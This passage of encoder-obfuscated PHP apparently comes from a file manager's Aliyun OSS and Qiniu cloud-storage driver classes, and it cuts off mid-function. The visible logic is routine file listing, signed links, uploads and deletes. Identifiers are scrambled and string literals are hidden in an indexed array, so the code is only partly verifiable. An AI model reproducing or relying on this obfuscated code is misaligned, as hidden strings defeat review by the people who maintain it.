(!$this->exist($Ùãæè) || $this->isFolder($Ùãæè)) { return !1; } try { $¤å¦½ = $this->trafficLimit($ˆ‰ç°­[110], $¤å¦½, !0); $âÇÀ = $this->client->signUrl($this->bucket, $this->pathEncode($Ùãæè), 3600 * 12, $ˆ‰ç°­[1542], $¤å¦½); return $this->getCdnLink($âÇÀ); } catch (OSS\Core\OssException $—ü¬º™ú) { $this->writeLog(__FUNCTION__ . $ˆ‰ç°­[213] . $—ü¬º™ú->getMessage()); return !1; } } public function fileOut($æŒñªÅÉ, $Ñ˜ÊÍø¼ = false, $µ®ä½ø = false, $ï††ÙÄ = '') { $ŞßÍ¼‹ğ =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->isFileOutServer()) { return $this->fileOutServer($æŒñªÅÉ, $Ñ˜ÊÍø¼, $µ®ä½ø, $ï††ÙÄ); } if (!$µ®ä½ø) { $µ®ä½ø = $this->pathThis($æŒñªÅÉ); } $µ®ä½ø = rawurlencode($µ®ä½ø); $„­¼œº£ = get_file_mime(get_path_ext($µ®ä½ø)); if ($„­¼œº£ == $ŞßÍ¼‹ğ[249]) { return parent::fileOut($æŒñªÅÉ, $Ñ˜ÊÍø¼, $µ®ä½ø, $ï††ÙÄ); } $Ñ˜ÊÍø¼ = $Ñ˜ÊÍø¼ ? $ŞßÍ¼‹ğ[1640] : $ŞßÍ¼‹ğ[1641]; $áƒ§½Ş² = array(OSS\OssClient::OSS_SUB_RESOURCE => $ŞßÍ¼‹ğ[1642] . rawurlencode("{$Ñ˜ÊÍø¼}\73\x66\x69\x6c\x65\x6e\x61\155\x65\x3d{$µ®ä½ø}")); $Èù‹Ó€Œ = $this->link($æŒñªÅÉ, $áƒ§½Ş²); $this->fileOutLink($Èù‹Ó€Œ); } public function fileOutServer($çŒã¾¶î, $ûÅ¬šÏ = false, $ı´‹”µú = false, $ù˜ñµ–ó = '') { parent::fileOut($çŒã¾¶î, $ûÅ¬šÏ, $ı´‹”µú, $ù˜ñµ–ó); } public function fileOutImage($îòº‹Â, $¹É¿»¯Õ = 250) { if ($this->size($îòº‹Â) > 1024 * 1024 * 20) { return $this->fileOutImageServer($îòº‹Â, $¹É¿»¯Õ); } $ãÑÒå—¯ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¿ÈˆÑ¸ä][1604] . $¹É¿»¯Õ); $‰ËĞˆé = $this->link($îòº‹Â, $ãÑÒå—¯); $this->fileOutLink($‰ËĞˆé); } public function fileOutImageServer($±É²ğ­, $€‰ËÉñ = 250) { parent::fileOutImage($±É²ğ­, $€‰ËÉñ); } public function fileOutLink($àª¥¦İš) { $ĞÃ·’å =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->isCdnHost() && substr($àª¥¦İš, 0, 7) == $ĞÃ·’å[217]) { $àª¥¦İš = $ĞÃ·’å[218] . substr($àª¥¦İš, 7); } header($ĞÃ·’å[173] . $àª¥¦İš); die; } public function hashMd5($–ƒ·„Ä±, $Ü†¯ûóÛ = '') { $Á™ï×ÀÒ =& $_SERVER[¿ÈˆÑ¸ä]; $õâ ³‚“ = $this->_objectMeta($–ƒ·„Ä±); if (!$õâ ³‚“) { return $Á™ï×ÀÒ[12]; } if (!isset($õâ ³‚“[$Á™ï×ÀÒ[1625]]) && !empty($Ü†¯ûóÛ)) { $Ç¬«Ç‚Õ = $this->updateObjMeta($–ƒ·„Ä±, array($Á™ï×ÀÒ[1625] => $Ü†¯ûóÛ)); $õâ ³‚“[$Á™ï×ÀÒ[1625]] = $Ç¬«Ç‚Õ ? $Ü†¯ûóÛ : $Á™ï×ÀÒ[12]; } return isset($õâ ³‚“[$Á™ï×ÀÒ[1625]]) ? strtolower($õâ ³‚“[$Á™ï×ÀÒ[1625]]) : $Á™ï×ÀÒ[12]; } public function size($½Îƒ¤â§) { $Ó×ÛØ‰º = $this->objectMeta($½Îƒ¤â§); return $Ó×ÛØ‰º ? $Ó×ÛØ‰º[$_SERVER[¿ÈˆÑ¸ä][79]] : 0; } public function info($”®õäÓ) { if ($this->isFolder($”®õäÓ)) { return $this->folderInfo($”®õäÓ); } else { if ($this->isFile($”®õäÓ)) { return $this->fileInfo($”®õäÓ); } } return !1; } public function exist($ÊÅûÄò) { return $this->isFile($ÊÅûÄò) || $this->isFolder($ÊÅûÄò); } public function isFile($óÛ«èªí) { return !$this->isFolder($óÛ«èªí) && $this->objectMeta($óÛ«èªí); } public function isFolder($ôİï®©) { return $this->cacheMethod($_SERVER[¿ÈˆÑ¸ä][178], $ôİï®©); } protected function objectMeta($üë±å¸½) { return $this->cacheMethod($_SERVER[¿ÈˆÑ¸ä][180], $üë±å¸½); } protected function _objectMeta($Ş· ©íó) { $®”ë§ë =& $_SERVER[¿ÈˆÑ¸ä]; try { $‰–Î·›¨ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ş· ©íó)); } catch (OSS\Core\OssException $ÃåŸ†¬Ë) { $this->writeLog(__FUNCTION__ . $®”ë§ë[213] . $ÃåŸ†¬Ë->getMessage()); $‰–Î·›¨ = !1; } if ($‰–Î·›¨) { $‰–Î·›¨[$®”ë§ë[79]] = intval($‰–Î·›¨[$®”ë§ë[1623]]); } return $‰–Î·›¨; } protected function _isFolder($ëâŠ×) { $’¼ûñÆ =& $_SERVER[¿ÈˆÑ¸ä]; if ($ëâŠ× == $’¼ûñÆ[12] || $ëâŠ× == $’¼ûñÆ[8]) { return !0; } $ò„€ÊíÈ = array($’¼ûñÆ[1618] => $’¼ûñÆ[8], $’¼ûñÆ[1619] => rtrim($ëâŠ×, $’¼ûñÆ[8]) . $’¼ûñÆ[8], $’¼ûñÆ[1620] => 1, $’¼ûñÆ[1621] => $’¼ûñÆ[12]); $ÍÃŒòØ« = $this->client->listObjects($this->bucket, $ò„€ÊíÈ); if ($ÍÃŒòØ«->getObjectList() || $ÍÃŒòØ«->getPrefixList()) { return !0; } return !1; } public function writeLog($—ßÇÄàõ = '', $ËıäÖ¬¾ = false) { $•åı•ñ =& $_SERVER[¿ÈˆÑ¸ä]; $Šíäİ˜ø = in_array(ACTION, array($•åı•ñ[211], $•åı•ñ[212])); if (!$Šíäİ˜ø && !GLOBAL_DEBUG) { return; } $å²ÕÔÇ¥ = 0; if (stripos($—ßÇÄàõ, $•åı•ñ[1643]) !== !1) { $å²ÕÔÇ¥ = 1; $ªÒÔ¡øŠ = explode($•åı•ñ[1644], $—ßÇÄàõ); $—ßÇÄàõ = !empty($ªÒÔ¡øŠ[1]) ? $ªÒÔ¡øŠ[1] : $—ßÇÄàõ; } else { if (stripos($—ßÇÄàõ, $•åı•ñ[1645])) { $å²ÕÔÇ¥ = 2; $ªÒÔ¡øŠ = explode($•åı•ñ[1645], $—ßÇÄàõ); $ªÒÔ¡øŠ = explode($•åı•ñ[4], $ªÒÔ¡øŠ[0]); $—ßÇÄàõ = !empty($ªÒÔ¡øŠ[1]) ? $ªÒÔ¡øŠ[1] : $—ßÇÄàõ; } } if ($Šíäİ˜ø && I18n::getType() == $•åı•ñ[1646]) { if ($å²ÕÔÇ¥ == 1) { $—ßÇÄàõ = str_replace($•åı•ñ[1647], $•åı•ñ[1648], $—ßÇÄàõ); } else { if ($å²ÕÔÇ¥ == 2) { $ªÒÔ¡øŠ = explode($•åı•ñ[213], $ªÒÔ¡øŠ[0]); $Îû•ÊÔ¸ = isset($ªÒÔ¡øŠ[1]) ? $ªÒÔ¡øŠ[1] : $•åı•ñ[12]; $Û†Ù¦Ë¡ = array($•åı•ñ[1649] => $•åı•ñ[1650], $•åı•ñ[1651] => $•åı•ñ[1652], $•åı•ñ[1653] => $•åı•ñ[1654], $•åı•ñ[1655] => $•åı•ñ[1656], $•åı•ñ[1657] => $•åı•ñ[1658], $•åı•ñ[1659] => $•åı•ñ[1660], $•åı•ñ[1661] => $•åı•ñ[1662], $•åı•ñ[1663] => $•åı•ñ[1664], $•åı•ñ[1665] => $•åı•ñ[1666], $•åı•ñ[1667] => $•åı•ñ[1668]); if (isset($Û†Ù¦Ë¡[$Îû•ÊÔ¸])) { $—ßÇÄàõ = $Û†Ù¦Ë¡[$Îû•ÊÔ¸]; } } } if (stripos($—ßÇÄàõ, $•åı•ñ[1669])) { $—ßÇÄàõ = $•åı•ñ[1670]; } } if (!trim($—ßÇÄàõ)) { return; } parent::writeLog(trim($—ßÇÄàõ), $ËıäÖ¬¾); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ï ³È±ş) { parent::__construct(); require_once SDK_DIR . $_SERVER[¿ÈˆÑ¸ä][1671]; $this->_init($ï ³È±ş); } public function _init($ÏıÄ„ü¨) { $ûı©Üç =& $_SERVER[¿ÈˆÑ¸ä]; $this->config = $ÏıÄ„ü¨; foreach ($ÏıÄ„ü¨ as $è¬Ç˜”Å => $£¤§ü˜Ş) { if (isset($this->{$è¬Ç˜”Å})) { $this->{$è¬Ç˜”Å} = $£¤§ü˜Ş; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ûı©Üç[1672] . LNG($ûı©Üç[1609])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ø¹ÚÌÌ¯, $Àµ”Âûï = '', $³®œÅ = REPEAT_RENAME) { if ($this->setContent($ø¹ÚÌÌ¯, $Àµ”Âûï)) { return $this->getPathOuter($ø¹ÚÌÌ¯); } return !1; } public function mkdir($§í·äŸÜ, $ì“ºÉı = REPEAT_SKIP) { $ñÑ‘œİœ =& $_SERVER[¿ÈˆÑ¸ä]; $ÛÜ±ŒºÜ = trim($§í·äŸÜ, $ñÑ‘œİœ[8]); if ($this->_isFolder($ÛÜ±ŒºÜ)) { return $this->getPathOuter($ÛÜ±ŒºÜ); } $§í·äŸÜ = $ÛÜ±ŒºÜ . $ñÑ‘œİœ[8]; $–Øè·öÂ = get_path_this($ÛÜ±ŒºÜ); $ÓşŸó´… = $§í·äŸÜ . $–Øè·öÂ; if (!$this->mkfile($ÓşŸó´…)) { return !1; } if (!$this->moveFile($ÓşŸó´…, $§í·äŸÜ)) { $this->delFile($ÓşŸó´…); return !1; } return $this->getPathOuter($ÛÜ±ŒºÜ); } public function copyFile($ü·›Ú¯, $¸Ä¤Èé“) { $Ì¨Ïİûú = $this->bucketManager->copy($this->bucket, $ü·›Ú¯, $this->bucket, $¸Ä¤Èé“, !0); return $Ì¨Ïİûú ? !1 : $this->getPathOuter($¸Ä¤Èé“); } public function moveFile($‡ÉİĞüì, $ì´È) { $‰„çöª– = $this->bucketManager->move($this->bucket, $‡ÉİĞüì, $this->bucket, $ì´È, !0); return $‰„çöª– ? !1 : $this->getPathOuter($ì´È); } public function delFile($›¶ÙŸ) { if (!$this->exist($›¶ÙŸ)) { return !0; } $Î³«ŒÖ = $this->bucketManager->delete($this->bucket, $›¶ÙŸ); if (!$Î³«ŒÖ) { return !0; } return $Î³«ŒÖ->code() == 612 ? !0 : !1; } public function delFolder($†¢Ó§÷) { $Äá”æì³ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->exist($†¢Ó§÷)) { return !0; } $this->listItemCache = !1; $ï´‘í§Å = $this->fileList($†¢Ó§÷); $this->listItemCache = !0; $êÑ‰­Àù = trim($†¢Ó§÷, $Äá”æì³[8]) . $Äá”æì³[8]; if (!empty($†¢Ó§÷) && $†¢Ó§÷ !== $Äá”æì³[229] && !in_array($êÑ‰­Àù, $ï´‘í§Å[$Äá”æì³[85]])) { $ï´‘í§Å[$Äá”æì³[85]][] = $êÑ‰­Àù; } $ƒ®¤Õ³ = $this->delByBatch($ï´‘í§Å[$Äá”æì³[86]]); if (!$ƒ®¤Õ³) { return !1; } $ƒ®¤Õ³ = $this->delByBatch($ï´‘í§Å[$Äá”æì³[85]]); if (!$ƒ®¤Õ³) { return !1; } return $this->delFile($êÑ‰­Àù); } private function delByBatch($°’ß„âÌ) { foreach (array_chunk($°’ß„âÌ, 1000) as $ÉÁ¿ç) { $ğÙ³µªÎ = $this->bucketManager->buildBatchDelete($this->bucket, $ÉÁ¿ç); list($Â•İ¶ëŸ, $™«®ëÆ) = $this->bucketManager->batch($ğÙ³µªÎ); if ($™«®ëÆ) { return !1; } } return !0; } public function rename($Üù ¿øÆ, $öÕ«Íûß) { return $this->renameObject($Üù ¿øÆ, $öÕ«Íûß); } public function fileInfo($·Ô““†, $øÒÂè› = false, $´”ƒ›´ø = array()) { $èÈ–—‹ƒ =& $_SERVER[¿ÈˆÑ¸ä]; $Ü›¤¦˜ş = array($èÈ–—‹ƒ[32] => $this->pathThis($·Ô““†), $èÈ–—‹ƒ[87] => $this->getPathOuter($èÈ–—‹ƒ[8] . $·Ô““†), $èÈ–—‹ƒ[33] => $èÈ–—‹ƒ[231], $èÈ–—‹ƒ[79] => isset($´”ƒ›´ø[$èÈ–—‹ƒ[1673]]) ? $´”ƒ›´ø[$èÈ–—‹ƒ[1673]] : 0, $èÈ–—‹ƒ[167] => $this->ext($·Ô““†)); if ($øÒÂè›) { return $Ü›¤¦˜ş; } $Ü›¤¦˜ş[$èÈ–—‹ƒ[232]] = $Ü›¤¦˜ş[$èÈ–—‹ƒ[88]] = 0; $Ü›¤¦˜ş[$èÈ–—‹ƒ[233]] = $Ü›¤¦˜ş[$èÈ–—‹ƒ[234]] = !0; if (empty($´”ƒ›´ø)) { $´”ƒ›´ø = $this->objectMeta($·Ô““†); if (!$´”ƒ›´ø) { return $Ü›¤¦˜ş; } } if (isset($´”ƒ›´ø[$èÈ–—‹ƒ[235]]) && $´”ƒ›´ø[$èÈ–—‹ƒ[235]]) { $Ü›¤¦˜ş[$èÈ–—‹ƒ[236]] = $´”ƒ›´ø[$èÈ–—‹ƒ[235]]; } if (isset($´”ƒ›´ø[$èÈ–—‹ƒ[246]]) && $´”ƒ›´ø[$èÈ–—‹ƒ[246]]) { $Ü›¤¦˜ş[$èÈ–—‹ƒ[236]] = $´”ƒ›´ø[$èÈ–—‹ƒ[246]]; } if (isset($´”ƒ›´ø[$èÈ–—‹ƒ[1674]])) { $Ü›¤¦˜ş[$èÈ–—‹ƒ[88]] = substr($´”ƒ›´ø[$èÈ–—‹ƒ[1674]] . $èÈ–—‹ƒ[12], 0, 10); } if (isset($´”ƒ›´ø[$èÈ–—‹ƒ[1673]])) { $Ü›¤¦˜ş[$èÈ–—‹ƒ[79]] = $´”ƒ›´ø[$èÈ–—‹ƒ[1673]]; } return $Ü›¤¦˜ş; } public function folderInfo($º¥§²ğï, $ Šœ¾²é = false) { $—é—‚– =& $_SERVER[¿ÈˆÑ¸ä]; $´Èû® = array($—é—‚–[32] => $this->pathThis($º¥§²ğï), $—é—‚–[87] => $this->getPathOuter($—é—‚–[8] . $º¥§²ğï), $—é—‚–[33] => $—é—‚–[78]); if ($ Šœ¾²é) { return $´Èû®; } $´Èû®[$—é—‚–[232]] = $´Èû®[$—é—‚–[88]] = 0; $´Èû®[$—é—‚–[233]] = $´Èû®[$—é—‚–[234]] = !0; $º¥§²ğï = rtrim($º¥§²ğï, $—é—‚–[8]) . $—é—‚–[8]; $‚İß÷†· = $this->objectMeta($º¥§²ğï); if (isset($‚İß÷†·[$—é—‚–[1674]])) { $´Èû®[$—é—‚–[88]] = substr($‚İß÷†·[$—é—‚–[1674]] . $—é—‚–[12], 0, 10); } return $´Èû®; } public function listPath($ÈçŒÀŞˆ, $â®°—š = false) { $ÏŒÛ÷Ÿó =& $_SERVER[¿ÈˆÑ¸ä]; $¤À¼§¦ = $this->fileList($ÈçŒÀŞˆ, $ÏŒÛ÷Ÿó[8], !0); foreach ($¤À¼§¦[$ÏŒÛ÷Ÿó[85]] as $ìıÏ¾öË => $ÏŸÄİ) { $¤À¼§¦[$ÏŒÛ÷Ÿó[85]][$ìıÏ¾öË] = $this->folderInfo($ÏŸÄİ, $â®°—š); } foreach ($¤À¼§¦[$ÏŒÛ÷Ÿó[86]] as $ìıÏ¾öË => $ÏŸÄİ) { $¤À¼§¦[$ÏŒÛ÷Ÿó[86]][$ìıÏ¾öË] = $this->fileInfo($ÏŸÄİ[$ÏŒÛ÷Ÿó[32]], $â®°—š, $ÏŸÄİ); } return $¤À¼§¦; } public function has($í®³ÙüÃ, $Ï„‹§ƒ§ = false, $–Åµõô = true) { $ôØî­É• =& $_SERVER[¿ÈˆÑ¸ä]; $í®³ÙüÃ = trim($í®³ÙüÃ, $ôØî­É•[8]); $ƒ®ş®´Ó = empty($í®³ÙüÃ) && $í®³ÙüÃ !== $ôØî­É•[229] ? $ôØî­É•[12] : $í®³ÙüÃ . $ôØî­É•[8]; $ùÆ€îäÇ = $ôØî­É•[12]; $ÁÖ•™Óå = 500; $»ï¯‘”Ñ = $ôØî­É•[8]; $Ú³’‡²® = $É¸¯¨É± = 0; while (!0) { check_abort(); list($Û½öØ¸ª, $Û²œ€ú§) = $this->bucketManager->listFiles($this->bucket, $ƒ®ş®´Ó, $ùÆ€îäÇ, $ÁÖ•™Óå, $»ï¯‘”Ñ); if ($Û²œ€ú§) { break; } $ùÆ€îäÇ = array_key_exists($ôØî­É•[1621], $Û½öØ¸ª) ? $ùÆ€îäÇ = $Û½öØ¸ª[$ôØî­É•[1675]] : $ôØî­É•[12]; if ($Ï„‹§ƒ§) { if (!empty($Û½öØ¸ª[$ôØî­É•[1676]])) { $Ú³’‡²® += count($Û½öØ¸ª[$ôØî­É•[1676]]); } if (!empty($Û½öØ¸ª[$ôØî­É•[1677]])) { $É¸¯¨É± += count($Û½öØ¸ª[$ôØî­É•[1677]]); } if ($ùÆ€îäÇ === $ôØî­É•[12]) { break; } continue; } if ($–Åµõô) { if (!empty($Û½öØ¸ª[$ôØî­É•[1676]])) { return !0; } } else { if (!empty($Û½öØ¸ª[$ôØî­É•[1677]])) { return !0; } } if ($ùÆ€îäÇ === $ôØî­É•[12]) { break; } } if ($Ï„‹§ƒ§) { return array($ôØî­É•[240] => $Ú³’‡²®, $ôØî­É•[241] => $É¸¯¨É±); } return !1; } public function listAll($ºÜÆêÄ) { $¬Ó¾ß‡ =& $_SERVER[¿ÈˆÑ¸ä]; $ÊõåºíÖ = $this->fileList($ºÜÆêÄ, $¬Ó¾ß‡[12], !0); $ò‘š±™Ú = array_to_keyvalue($ÊõåºíÖ[$¬Ó¾ß‡[86]], $¬Ó¾ß‡[32]); foreach ($ÊõåºíÖ[$¬Ó¾ß‡[85]] as $Ü§ÇÓ–¬) { if (is_string($Ü§ÇÓ–¬)) { $ò‘š±™Ú[$Ü§ÇÓ–¬] = array($¬Ó¾ß‡[79] => 0); } } return $this->listAllFiles($ºÜÆêÄ, $ò‘š±™Ú); } private function fileList($¿ÔÁö‰¼, $Í³®ˆ× = '', $ÙÉóò“Ç = 0) { $ªÎë Üö =& $_SERVER[¿ÈˆÑ¸ä]; $¿ÔÁö‰¼ = trim($¿ÔÁö‰¼, $ªÎë Üö[8]); $ö±ü‘¡Ã = empty($¿ÔÁö‰¼) && $¿ÔÁö‰¼ !== $ªÎë Üö[229] ? $ªÎë Üö[12] : $¿ÔÁö‰¼ . $ªÎë Üö[8]; $Íò®¨ùæ = $ªÎë Üö[12]; $¿¯‰ñŒ = 1000; $äææñ˜¿ = $¼µØË‰î = array(); while (!0) { check_abort(); list($î²ÇÇ‚Æ, $ûİÙ­à‹) = $this->bucketManager->listFiles($this->bucket, $ö±ü‘¡Ã, $Íò®¨ùæ, $¿¯‰ñŒ, $Í³®ˆ×); if ($ûİÙ­à‹) { break; } $Íò®¨ùæ = array_key_exists($ªÎë Üö[1621], $î²ÇÇ‚Æ) ? $Íò®¨ùæ = $î²ÇÇ‚Æ[$ªÎë Üö[1675]] : $ªÎë Üö[12]; $öÁ¦Ô¦Ã = isset($î²ÇÇ‚Æ[$ªÎë Üö[1676]]) ? $î²ÇÇ‚Æ[$ªÎë Üö[1676]] : array(); $ª›†ì¯§ = isset($î²ÇÇ‚Æ[$ªÎë Üö[1677]]) ? $î²ÇÇ‚Æ[$ªÎë Üö[1677]] : array(); foreach ($öÁ¦Ô¦Ã as $®¾šĞ§ä) { if ($®¾šĞ§ä[$ªÎë Üö[95]] == $ö±ü‘¡Ã) { continue; } $ûš³üÔô = $®¾šĞ§ä[$ªÎë Üö[95]]; $ºáäÁ¼– = $®¾šĞ§ä[$ªÎë Üö[1673]]; $®¾šĞ§ä[$ªÎë Üö[32]] = $ûš³üÔô; $®¾šĞ§ä[$ªÎë Üö[79]] = $ºáäÁ¼–; $¦ŞÂÔÕÍ = $ºáäÁ¼– == 0 && substr($ûš³üÔô, strlen($ûš³üÔô) - 1, 1) == $ªÎë Üö[8] ? !0 : !1; $this->cacheMethodInfoSet($ûš³üÔô, $¦ŞÂÔÕÍ, $®¾šĞ§ä); if ($¦ŞÂÔÕÍ) { $äææñ˜¿[] = $ûš³üÔô; continue; } $¼µØË‰î[] = $ÙÉóò“Ç ? $®¾šĞ§ä : $ûš³üÔô; } foreach ($ª›†ì¯§ as $ûš³üÔô) { if ($ûš³üÔô == $ö±ü‘¡Ã) { continue; } $äææñ˜¿[] = $ûš³üÔô; $this->cacheMethodInfoSet($ûš³üÔô, !0); } if ($Íò®¨ùæ === $ªÎë Üö[12]) { break; } } $this->cacheMethodInfoSet($¿ÔÁö‰¼, !0); return array($ªÎë Üö[85] => $äææñ˜¿, $ªÎë Üö[86] => $¼µØË‰î); } public function canRead($ÕÒààÉÛ) { return $this->exist($ÕÒààÉÛ) ? !0 : !1; } public function canWrite($ê¿Û§ïù) { return $this->exist($ê¿Û§ïù) ? !0 : !1; } public function getContent($Œ°”¢ò») { return $this->fileSubstr($Œ°”¢ò», 0, -1); } public function setContent($ş±ºÁ«á, $œÔ²›Œ³ = '') { $Ê±ÄİõÍ = $this->tempFile($this->pathThis($ş±ºÁ«á)); file_put_contents($Ê±ÄİõÍ, $œÔ²›Œ³); if ($this->upload($ş±ºÁ«á, $Ê±ÄİõÍ)) { $this->tempFileRemve($Ê±ÄİõÍ); return !0; } return !1; } public function refreshUrls($‰ßñ¥îğ) { $¦ÑğòõÌ =& $_SERVER[¿ÈˆÑ¸ä]; $ŞÆ¼åßË = array(); if (is_array($‰ßñ¥îğ)) { foreach ($‰ßñ¥îğ as $¶òÉÕ„É) { $ŞÆ¼åßË[] = $this->link($¶òÉÕ„É); } } else { $ŞÆ¼åßË[] = $this->link($‰ßñ¥îğ); } $ÒÌËë¬‘ = new Qiniu\Cdn\CdnManager($this->auth); list($“˜Ş•¤, $ÇÕáƒÏ) = $ÒÌËë¬‘->refreshUrls($ŞÆ¼åßË); if ($ÇÕáƒÏ) { return !1; } return $“˜Ş•¤[$¦ÑğòõÌ[1304]] == $¦ÑğòõÌ[843] ? !0 : !1; } public function fileSubstr($ÅÅº½Ö¤, $Ø¿ùàà­, $¦åİòªÄ) { $ÍÏ¸ÀãÁ =& $_SERVER[¿ÈˆÑ¸ä]; if (!($¬šÂ…ø™ = $this->link($ÅÅº½Ö¤))) { return !1; } $èË©›¨œ = !1; if ($¦åİòªÄ > 0) { $ú³¾ª¢ = $Ø¿ùàà­ + $¦åİòªÄ - 1; $èË©›¨œ = array($ÍÏ¸ÀãÁ[1541] . $Ø¿ùàà­ . $ÍÏ¸ÀãÁ[473] . $ú³¾ª¢); } $òÃë†ôü = url_request($¬šÂ…ø™, $ÍÏ¸ÀãÁ[1542], !1, $èË©›¨œ); return $òÃë†ôü[$ÍÏ¸ÀãÁ[833]] ? $òÃë†ôü[$ÍÏ¸ÀãÁ[1326]] : !1; } public function upload($ÑËûïåÏ, $ïĞØ§Ğˆ, $ÚùĞİãÒ = false, $Çíí‹Äñ = REPEAT_REPLACE) { $òƒÊ¦Ø½ = new Qiniu\Storage\UploadManager(); $ÉüÊèäì = $this->auth->uploadToken($this->bucket, $ÑËûïåÏ); $Éñ»Üëª = get_file_mime(get_path_ext($ïĞØ§Ğˆ)); list($ØæüòÅÎ, $µ˜ÛÀâÂ) = $òƒÊ¦Ø½->putFile($ÉüÊèäì, $ÑËûïåÏ, $ïĞØ§Ğˆ, null, $Éñ»Üëª); return $µ˜ÛÀâÂ ? !1 : $this->getPathOuter($ÑËûïåÏ); } public function uploadFormData($ÚÔÄÃÎÇ, $¨ÇºĞ×æ = 3600) { return $this->uploadToken($ÚÔÄÃÎÇ, $¨ÇºĞ×æ); } public function uploadMultiData($ ’Ñ‚˜, $ï™áÃÙ = 3600) { return $this->uploadToken($ ’Ñ‚˜, $ï™áÃÙ); } private function uploadToken($ª òšÚÔ, $—Éä÷ö„ = 3600) { $Œô³ÄÉ =& $_SERVER[¿ÈˆÑ¸ä]; $âëØ¬ë = $—Éä÷ö„; $õ’úÏóİ = array($Œô³ÄÉ[1678] => $Œô³ÄÉ[1679]); $åöå¯ı— = $ª òšÚÔ; $Ç“Ãéâğ = $this->auth->uploadToken($this->bucket, $åöå¯ı—, $âëØ¬ë, $õ’úÏóİ, !0); $¸°òÑğ = empty($this->region) || $this->region == $Œô³ÄÉ[1680] ? $Œô³ÄÉ[12] : $Œô³ÄÉ[473] . $this->region; $°Ï‡ëš– = http_type() . "\72\x2f\57\165\160\x6c\x6f\x61\x64{$¸°òÑğ}\x2e\x71\151\x6e\x69\x75\160\x2e\143\x6f\155\57"; return array($Œô³ÄÉ[1681] => $Ç“Ãéâğ, $Œô³ÄÉ[1544] => $°Ï‡ëš–); } public function download($ìƒ¨‰‰, $ÈÕ…Ëí) { $·¡Ùê» = IO::getPathInner(IO::mkfile($ÈÕ…Ëí)); if (!($„´Úˆ¨ã = $this->link($ìƒ¨‰‰))) { return !1; } $‚äßö£ë = 0; $œ±úìã = 1024 * 200; $€‚¹èÀ = fopen($·¡Ùê», $_SERVER[¿ÈˆÑ¸ä][1682]); while (!0) { $‹Œâ¨öç = $this->fileSubstr($ìƒ¨‰‰, $‚äßö£ë, $œ±úìã); if ($‹Œâ¨öç === !1) { return !1; } fwrite($€‚¹èÀ, $‹Œâ¨öç); $‚äßö£ë += $œ±úìã; if (strlen($‹Œâ¨öç) < $œ±úìã) { break; } } fclose($€‚¹èÀ); return $ÈÕ…Ëí; } public function link($…Ï¼Á–, $¸şƒ¦Ì¾ = '') { if (!$this->isFile($…Ï¼Á–)) { return !1; } $§…­†·Á = $this->getHost() . $_SERVER[¿ÈˆÑ¸ä][8] . $this->pathEncode($…Ï¼Á–) . $¸şƒ¦Ì¾; return $this->auth->privateDownloadUrl($§…­†·Á, 3600 * 12); } public function fileOut($õª¢˜ÆÀ, $±äË¯… = false, $ĞÖÛ±€ = false, $Ö– ÄÆŠ = '') { $À™›¯™Ê =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->isFileOutServer()) { return $this->fileOutServer($õª¢˜ÆÀ, $±äË¯…, $ĞÖÛ±€, $Ö– ÄÆŠ); } if (!$ĞÖÛ±€) { $ĞÖÛ±€ = $this->pathThis($õª¢˜ÆÀ); } $û»§  = $±äË¯… ? $À™›¯™Ê[1683] . rawurlencode($ĞÖÛ±€) : $À™›¯™Ê[12]; $²ß™šÖŞ = $this->link($õª¢˜ÆÀ, $û»§ ); $this->fileOutLink($²ß™šÖŞ); } public function fileOutServer($ïŞ÷ˆ½É, $ƒ²Ê¥îâ = false, $öÛÅ¯ê = false, $ÛÒ˜ËºŠ = '') { parent::fileOut($ïŞ÷ˆ½É, $ƒ²Ê¥îâ, $öÛÅ¯ê, $ÛÒ˜ËºŠ); } public function fileOutImage($ç§’´„ƒ, $êÌ¬šü¼ = 250) { if ($this->size($ç§’´„ƒ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ç§’´„ƒ, $êÌ¬šü¼); } $°ÌëÓ = $this->link($ç§’´„ƒ, $_SERVER[¿ÈˆÑ¸ä][1684] . $êÌ¬šü¼); $this->fileOutLink($°ÌëÓ); } public function fileOutImageServer($‹„ ÚÂÃ, $À¨È„÷ = 250) { parent::fileOutImage($‹„ ÚÂÃ, $À¨È„÷); } public function hashMd5($àû¤Ä¹ì) { $†ŒÁÚ§Œ =& $_SERVER[¿ÈˆÑ¸ä]; $»„²›Ü = $this->objectMeta($àû¤Ä¹ì); return isset($»„²›Ü[$†ŒÁÚ§Œ[246]]) ? $»„²›Ü[$†ŒÁÚ§Œ[246]] : !1; $¤¹Ù¨ß = $this->link($àû¤Ä¹ì, $†ŒÁÚ§Œ[1685]); } public function size($û½¥´›ó) { $ı¯‘û = $this->objectMeta($û½¥´›ó); return $ı¯‘û ? $ı¯‘û[$_SERVER[¿ÈˆÑ¸ä][79]] : 0; } public function info($ö´ƒ÷¯) { if ($this->isFolder($ö´ƒ÷¯)) { return $this->folderInfo($ö´ƒ÷¯); } else { if ($this->isFile($ö´ƒ÷¯)) { return $this->fileInfo($ö´ƒ÷¯); } } return !1; } public function exist($¨€’•ÅË) { return $this->isFile($¨€’•ÅË) || $this->isFolder($¨€’•ÅË); } public function isFile($ª´Øòé¸) { return !$this->isFolder($ª´Øòé¸) && $this->objectMeta($ª´Øòé¸); } public function isFolder($¥˜«ğÌ¼) { return $this->cacheMethod($_SERVER[¿ÈˆÑ¸ä][178], $¥˜«ğÌ¼); } protected function objectMeta($˜¹úŞœú) { return $this->cacheMethod($_SERVER[¿ÈˆÑ¸ä][180], $˜¹úŞœú); } protected function _objectMeta($ªá‘‡¯) { $šµéÁİ“ =& $_SERVER[¿ÈˆÑ¸ä]; list($ê÷¥ØÚ, $ğÄ™¾˜ ) 